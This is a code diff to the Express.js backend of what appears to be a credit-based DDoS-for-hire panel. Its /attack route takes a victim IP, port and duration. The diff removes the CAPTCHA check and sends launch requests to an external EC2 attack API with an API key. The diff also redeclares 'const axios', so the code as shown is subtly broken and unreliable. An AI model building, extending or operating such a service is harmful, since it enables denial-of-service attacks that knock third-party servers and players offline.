@@ -4,7 +4,8 @@ const auth = require('../middleware/authMiddleware');
 const User = require('../models/User');
 const axios = require('axios');
 const bgmiService = require('../services/bgmiService');
-
+const axios = require('axios');
+require('dotenv').config();
 // ── In-memory attack tracker ──────────────────────────────────────────────────
 const activeAttacks = new Map();
 
@@ -142,7 +143,7 @@ router.post('/attack', auth, async (req, res) => {
             return res.status(400).json({ message: 'Port must be between 1 and 65535' });
         }
 
-        // ✅ Blocked port check
+        // Blocked ports
         if (BLOCKED_PORTS.has(portNum)) {
             return res.status(400).json({
                 message: `Port ${portNum} is blocked and cannot be used.`
@@ -167,19 +168,6 @@ router.post('/attack', auth, async (req, res) => {
             });
         }
 
-        // CAPTCHA validation
-        if (!captchaToken) {
-            return res.status(400).json({ message: 'CAPTCHA is required' });
-        }
-        const captcha = await verifyTurnstile(captchaToken, req.ip);
-        if (!captcha.success) {
-            return res.status(400).json({
-                message: captcha['error-codes']?.includes('duplicate-use')
-                    ? 'CAPTCHA already used. Please solve it again.'
-                    : 'CAPTCHA verification failed. Please try again.',
-            });
-        }
-
         // Credit check
         if (user.credits < 1) {
             return res.status(403).json({
@@ -195,27 +183,45 @@ router.post('/attack', auth, async (req, res) => {
             });
         }
 
-        // ✅ Fire ALL servers simultaneously
-        const bgmiResponse = await bgmiService.startServer(ip, portNum, durNum, 8);
+        // 🔥 CALL YOUR EC2 API
+        const response = await axios.post(
+            process.env.API_URL,
+            {
+                param1: ip,
+                param2: portNum,
+                param3: durNum
+            },
+            {
+                headers: {
+                    "Content-Type": "application/json",
+                    "x-api-key": process.env.API_KEY
+                },
+                timeout: 15000,
+                validateStatus: () => true
+            }
+        );
 
-        if (!bgmiResponse.success) {
-            console.error('BGMI server start failed:', bgmiResponse.error);
-            return res.status(500).json({
-                message: 'Failed to start attack. Please try again.',
+        // If external API failed
+        if (response.status !== 200) {
+            console.error('External API failed:', response.data);
+
+            return res.status(response.status).json({
+                message: "Failed to start attack",
+                external: response.data
             });
         }
 
-        // Register active attack — store _activeUrls internally, never send to client
+        // Register attack
         const startedAt = new Date().toISOString();
+
         activeAttacks.set(user._id.toString(), {
-            _activeUrls: bgmiResponse._activeUrls, // internal only
             ip,
             port: portNum,
             duration: durNum,
             startedAt
         });
 
-        // Auto-clear after duration expires (+5s buffer)
+        // Auto clear
         setTimeout(() => {
             activeAttacks.delete(user._id.toString());
         }, durNum * 1000 + 5000);
@@ -227,9 +233,8 @@ router.post('/attack', auth, async (req, res) => {
             { new: true }
         );
 
-        console.log(`🚀 Attack launched by ${user.username} → ${ip}:${portNum} for ${durNum}s on ${bgmiResponse.serversStarted}/${bgmiResponse.totalServers} servers`);
+        console.log(`🚀 Attack launched by ${user.username} → ${ip}:${portNum} for ${durNum}s`);
 
-        // ✅ Response has NO server URLs — only what frontend needs
         return res.json({
             message: 'Attack launched successfully',
             attack: {
@@ -237,7 +242,7 @@ router.post('/attack', auth, async (req, res) => {
                 port: portNum,
                 duration: durNum,
                 startedAt,
-                serversStarted: bgmiResponse.serversStarted
+                externalResponse: response.data
             },
             credits: updated.credits,
             isPro: user.isPro,
